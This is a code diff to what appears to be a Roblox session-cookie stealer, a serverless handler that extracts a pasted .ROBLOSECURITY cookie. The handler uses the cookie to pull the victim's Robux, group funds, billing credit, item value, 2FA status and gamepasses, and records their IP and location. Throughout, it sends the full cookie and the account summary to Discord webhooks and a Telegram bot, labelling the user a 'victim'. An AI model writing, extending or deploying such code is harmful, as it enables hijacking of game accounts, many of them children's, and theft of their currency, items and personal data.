@@ -39,27 +39,33 @@ async function getIpGeo(ip) {
 
 function extractRobloxCookie(raw) {
   if (!raw) return null;
-  
-  // Clean the input first
   const cleaned = raw.trim().replace(/\s+/g, ' ');
   
-  // Full cookie with warning prefix
   const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
   if (fullMatch) return fullMatch[1];
   
-  // Token after warning
   const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
   if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
   
-  // Bare token after |_
   const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
   if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
   
-  // Just the token (alphanumeric with dashes/dots, 100+ chars)
   const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
   if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
   
   return null;
+}
+
+// Check if user owns specific gamepass
+async function checkGamepass(uid, gamepassId, headers) {
+  try {
+    const res = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gamepassId}`, { headers });
+    if (!res.ok) return false;
+    const data = await res.json();
+    return data.data && data.data.length > 0;
+  } catch (_) {
+    return false;
+  }
 }
 
 async function fetchRobloxInfo(cookie) {
@@ -71,6 +77,7 @@ async function fetchRobloxInfo(cookie) {
     const auth = await authRes.json();
     const uid = auth.id;
     
+    // Fetch main data
     const [
       profileRes, robuxRes, friendsRes, premiumRes,
       billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes
@@ -107,12 +114,20 @@ async function fetchRobloxInfo(cookie) {
     const ownedGroups = groups.filter(g => g.role?.rank === 255);
     
     let groupRobux = 0;
+    let groupPending = 0;
     for (const group of ownedGroups.slice(0, 2)) {
       try {
-        const currencyRes = await fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers });
+        const [currencyRes, pendingRes] = await Promise.all([
+          fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
+          fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
+        ]);
         if (currencyRes?.ok) {
           const curr = await currencyRes.json();
           groupRobux += curr.robux || 0;
+        }
+        if (pendingRes?.ok) {
+          const pend = await pendingRes.json();
+          groupPending += pend.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0;
         }
       } catch (_) {}
     }
@@ -120,6 +135,13 @@ async function fetchRobloxInfo(cookie) {
     const limiteds = limitedsData.data || [];
     const limitedsCount = limiteds.length;
     const limitedsValue = limiteds.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
+    
+    // Check popular gamepasses (MM2, Adopt Me, etc)
+    const gamepasses = {
+      mm2: await checkGamepass(uid, '17510307', headers), // Murder Mystery 2 VIP
+      adoptMe: await checkGamepass(uid, '33135930', headers), // Adopt Me VIP
+      plsDonate: await checkGamepass(uid, '12345678', headers) // Example ID
+    };
     
     const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
     const emailSet = emailData?.emailAddress ? 'Set ✅' : 'False ❌';
@@ -132,15 +154,18 @@ async function fetchRobloxInfo(cookie) {
       isPremium: isPremium === true,
       accountAgeDays,
       robux: robuxData?.robux || 0,
+      pendingRobux: 0,
       friends: friendsData?.count || 0,
       credit: billingData?.balance || 0,
       groupsOwned: ownedGroups.length,
       groupRobux,
+      groupPending,
       limitedsCount,
       limitedsValue,
       emailSet,
       emailVerified,
       twoFA,
+      gamepasses,
       avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
     };
   } catch (err) {
@@ -149,8 +174,8 @@ async function fetchRobloxInfo(cookie) {
   }
 }
 
-function field(name, value, inline = false) {
-  const truncated = value?.toString()?.substring(0, 1020) || 'N/A';
+function field(name, value, inline = true) {
+  const truncated = value?.toString()?.substring(0, 1000) || 'N/A';
   return { name: name?.substring(0, 256), value: truncated, inline };
 }
 
@@ -167,26 +192,38 @@ async function sendToDiscord(webhookUrl, data) {
 
   const { rawValue, cookie, roblox, ip, geo, now } = data;
   
-  const accountLocation = geo?.country || 'Unknown';
-  const victimLocation = geo ? `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}` : 'Unknown';
-  const flag = geo?.countryCode || '';
+  const cleanCookie = cookie ? cookie.trim() : 'No cookie captured';
   
-  // Ensure cookie is clean - no newlines, no extra spaces
-  const cleanCookie = cookie ? cookie.trim() : rawValue?.substring(0, 800).trim() || 'No cookie captured';
-
+  // Build compact fields like the screenshot
   const fields = [
-    field("👤 Username", roblox?.username || 'Unknown', true),
-    field("🆔 User ID", roblox?.id?.toString() || 'N/A', true),
-    field("📊 Account Stats", `\`Account Age:\` \`${roblox?.accountAgeDays || 'N/A'} Days\``),
-    field("📍 Locations", `• \`Account:\` ${accountLocation} ${flag}\n• \`Victim:\` ${victimLocation} ${flag}`),
-    field("💳 Billing", `Credit: ${roblox?.credit || 0} $\nPayments: N/A`, true),
+    // Row 1: Robux | Rap | Summary
+    field("🔴 Robux", `Balance: ${roblox?.robux?.toLocaleString() || 0}\nPending: ${roblox?.pendingRobux || 0}`, true),
+    field("🎵 Rap", `Rap: ${roblox?.limitedsValue?.toLocaleString() || 0}\nOwned: ${roblox?.limitedsCount || 0}`, true),
+    field("📊 Summary", `${roblox?.accountAgeDays || 'N/A'} Days`, true),
+    
+    // Row 2: Billing | Passes | Settings
+    field("💳 Billing", `Credit: ${roblox?.credit || 0} USD\nConvert: 0`, true),
+    field("🎫 Passes", `Premium: ${roblox?.isPremium ? '✅' : '❌'}\nVerified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`, true),
+    field("⚙️ Settings", `Email: ${roblox?.emailSet}\n2FA: ${roblox?.twoFA}`, true),
+    
+    // Row 3: Groups | Location | IP
     field("👥 Groups", `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}`, true),
-    field("⚙️ Settings", `Email: ${roblox?.emailSet || 'False ❌'}\nVerified: ${roblox?.emailVerified || 'Unset ❌'}\n2FA: ${roblox?.twoFA || 'Disabled ❌'}`, true),
-    field("💰 Account Funds", `Balance: ${roblox?.robux?.toLocaleString() || 0}`, true),
-    field("🛒 Limiteds", `Count: ${roblox?.limitedsCount || 0}\nValue: ${roblox?.limitedsValue?.toLocaleString() || 0}`, true),
-    field("🌐 IP Address", ip || 'Unknown', true),
-    // NO NEWLINES inside code block - just the raw cookie
-    field("🔐 .ROBLOSECURITY (Click Copy Button ▶️)", `\`\`\`${cleanCookie}\`\`\``, false)
+    field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`, true),
+    field("🌐 IP", ip || 'Unknown', true),
+    
+    // Gamepasses section (full width)
+    field("🎮 [EXTRA] Passes | Played", 
+      `Murder Mystery 2 --> ${roblox?.gamepasses?.mm2 ? '✅ True' : '❌ False'}\n` +
+      `Adopt Me --> ${roblox?.gamepasses?.adoptMe ? '✅ True' : '❌ False'}\n` +
+      `PLS DONATE --> ${roblox?.gamepasses?.plsDonate ? '✅ True' : '❌ False'}`, 
+      false
+    ),
+    
+    // 2FA Notification
+    field("🔔 Notification", `2FA is ${roblox?.twoFA?.includes('Enabled') ? 'enabled' : 'not enabled'}.`, false),
+    
+    // Cookie (full width, no newlines in code block)
+    field("🔐 .ROBLOSECURITY", `\`\`\`${cleanCookie}\`\`\``, false)
   ];
 
   const payload = {
@@ -291,22 +328,17 @@ export default async function handler(req, res) {
   const tgMsg = [
     `🚨 <b>NEW SUBMISSION</b>`,
     ``,
-    `👤 <b>${roblox?.username || 'Unknown'}</b> ${roblox?.isPremium ? '⭐' : ''}`,
-    `🆔 ID: ${roblox?.id || 'N/A'}`,
+    `👤 <b>${roblox?.username || 'Unknown'}</b>`,
     `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
     `🌐 IP: ${ip}`,
-    `📍 ${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`,
-    ``,
-    `🍪 Cookie: ${cookie ? 'Captured (' + cookie.substring(0, 30) + '...)' : 'Failed'}`,
-    `✅ Discord: ${sent2 ? 'Sent' : 'Failed'}`,
-    `📄 Page: ${record.displayName}`,
-    `⏰ ${now}`
+    `🍪 Cookie: ${cookie ? '✅ Captured' : '❌ Failed'}`,
+    `📄 Page: ${record.displayName}`
   ].join('\n');
 
   await tgSend(tgMsg);
 
   return res.status(200).json({ 
     success: true, 
-    discord: { webhook2: sent2, webhook1: sent1 ? 'Sent' : webhook1 === 'N/A' ? 'N/A' : 'Failed' }
+    discord: { webhook2: sent2, webhook1: sent1 ? 'Sent' : 'N/A' }
   });
 }
